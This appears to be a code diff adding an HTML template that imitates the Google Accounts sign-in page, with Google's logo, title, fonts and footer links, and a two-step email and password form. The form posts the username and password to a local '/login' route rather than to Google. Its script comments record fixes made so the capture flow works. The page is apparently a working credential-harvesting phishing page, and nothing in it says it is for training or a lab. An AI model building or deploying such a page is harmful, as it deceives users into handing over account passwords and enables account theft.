@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Sign in – Google Accounts</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --background:#202124; --card:#171717; --text:#e8eaed; --muted:#9aa0a6;
+    --link:#8ab4f8; --border:#5f6368; --btn:#8ab4f8; --btn-h:#aecbfa;
+  }
+
+  body {
+    background:var(--background);
+    font-family:'Google Sans',Roboto,Arial,sans-serif;
+    color:var(--text);
+    margin:0;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    min-height:100vh;
+  }
+
+  /* Login box */
+  .box {
+    background:var(--card);
+    border-radius:28px;
+    box-shadow:0 2px 10px rgba(0,0,0,.6);
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    width:760px;
+    max-width:92%;
+    padding:56px 64px;
+    box-sizing:border-box;
+    margin-bottom:30px;
+  }
+
+  .left { flex:1; }
+  .google-logo { width:80px; margin-bottom:30px; }
+  h1 { font-weight:400; font-size:28px; margin:0 0 8px 0; }
+  .sub { color:var(--muted); font-size:14px; }
+
+  .right { flex:1; }
+  form { margin-left:40px; }
+
+  input {
+    width:100%;
+    padding:14px;
+    border:1px solid var(--border);
+    border-radius:4px;
+    background:transparent;
+    color:var(--text);
+    font-size:15px;
+    margin-bottom:12px;
+  }
+
+  input:focus {
+    outline:none;
+    border:1px solid var(--link);
+    box-shadow:0 0 0 1px var(--link);
+  }
+
+  a { color:var(--link); font-size:14px; text-decoration:none; }
+  a:hover { text-decoration:underline; }
+
+  .hint {
+    color:var(--muted);
+    font-size:13px;
+    line-height:1.5;
+    margin-top:18px;
+  }
+  .hint a { color:var(--link); }
+
+  .actions {
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-top:36px;
+  }
+
+  button {
+    background:var(--btn);
+    color:#202124;
+    border:none;
+    border-radius:24px;
+    padding:10px 28px;
+    font-weight:500;
+    font-size:14px;
+    cursor:pointer;
+    transition:background-color .2s;
+  }
+  button:hover { background:var(--btn-h); }
+
+  /* Footer directly below the box */
+  .footer {
+    width:760px;
+    max-width:92%;
+    font-size:12px;
+    color:var(--muted);
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+  }
+  .footer-links { display:flex; gap:16px; }
+  .footer-links a { color:var(--muted); }
+  .footer-links a:hover { text-decoration:underline; }
+
+  #password-field { display:none; }
+
+  @media(max-width:768px){
+    .box { flex-direction:column; width:90%; padding:40px; }
+    form { margin-left:0; margin-top:30px; }
+    .footer { flex-direction:column; text-align:center; gap:8px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="box">
+  <div class="left">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png"
+         alt="Google" class="google-logo">
+    <h1>Sign in</h1>
+    <div class="sub">Use your Google Account</div>
+  </div>
+
+  <div class="right">
+    {% if error %}
+      <div style="color:#f28b82;font-size:13px;">{{ error }}</div>
+    {% endif %}
+    <form id="loginForm" method="post" action="/login">
+      <div id="email-field">
+        <input type="email" name="username" id="username" placeholder="Email or phone" required>
+        <a href="#">Forgot email?</a>
+        <div class="hint">
+          Not your computer? Use Guest mode to sign in privately.
+          <a href="#">Learn more</a>
+        </div>
+      </div>
+
+      <div id="password-field">
+        <input type="password" name="password" id="password" placeholder="Enter your password" required>
+        <a href="#">Forgot password?</a>
+      </div>
+
+      <div class="actions">
+        <a href="/signup">Create account</a>
+        <button type="button" id="nextBtn">Next</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<div class="footer">
+  <div>English (United Kingdom) ▾</div>
+  <div class="footer-links">
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
+</div>
+
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // --- Get all elements ---
+    const nextBtn = document.getElementById('nextBtn');
+    const emailField = document.getElementById('email-field');
+    const passwordField = document.getElementById('password-field');
+    const form = document.getElementById('loginForm');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+
+    // --- Helper function to advance UI ---
+    // We need this in two places: on page load (if error) and on button click.
+    function advanceToPassword(focusPassword = false) {
+      emailField.style.display = 'none';
+      passwordField.style.display = 'block';
+      nextBtn.textContent = 'Login';
+      usernameInput.readOnly = true;
+      if (focusPassword) {
+        passwordInput.focus();
+      }
+    }
+
+    // --- FIX 2: Handle failed login state on page load ---
+    // Check if the server rendered an error message (by looking for its style)
+    const errorDiv = document.querySelector('div[style*="color:#f28b82"]');
+    const email = usernameInput.value.trim();
+
+    if (errorDiv && email.length > 0) {
+      // Error is present and email is pre-filled,
+      // so skip straight to the password step.
+      advanceToPassword(true); // true = focus the password input
+    }
+
+    // --- FIX 1: Fix validation on 'Next' click ---
+    nextBtn.addEventListener('click', () => {
+      if (passwordField.style.display === 'none' || passwordField.style.display === '') {
+        // Step 1: Validate email and advance
+        const currentEmail = usernameInput.value.trim();
+        
+        // FIX: Removed '@gmail.com' check. We just check if it's not empty.
+        // The 'required' attribute handles most of this, but this is a
+        // good JS fallback.
+        if (currentEmail.length === 0) {
+          alert("Please enter your email or phone number.");
+          return;
+        }
+        
+        advanceToPassword(true); // Advance UI and focus password
+        
+      } else {
+        // Step 2: Submit the form
+        form.submit();
+      }
+    });
+  });
+</script>
+</body>
+</html>
